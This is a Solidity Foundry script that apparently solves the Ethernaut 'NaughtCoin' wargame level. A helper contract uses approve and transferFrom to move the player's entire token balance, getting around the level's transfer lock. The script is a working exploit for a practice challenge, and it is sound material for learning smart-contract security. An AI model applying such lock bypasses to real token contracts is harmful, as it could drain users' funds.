// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface INaughtCoin {
    function player() external view returns (address);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract Hack {
    function pwn(IERC20 coin) external {
        address player = INaughtCoin(address(coin)).player();
        uint256 balance = coin.balanceOf(player);
        coin.transferFrom(player, address(this), balance);
    }
 }


contract NaughtCoinSolution is Script {

    IERC20 coin = IERC20(0x05D76d33D0A8c226Ed0F6Efef278E1D9144e77f8);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address account = vm.envAddress("MY_ADDRESS");
        Hack hack = new Hack();
        uint256 naughtCoinBalance  = coin.balanceOf(account);
        coin.approve(address(hack), naughtCoinBalance);
        hack.pwn(coin);
        vm.stopBroadcast();
        
    }
}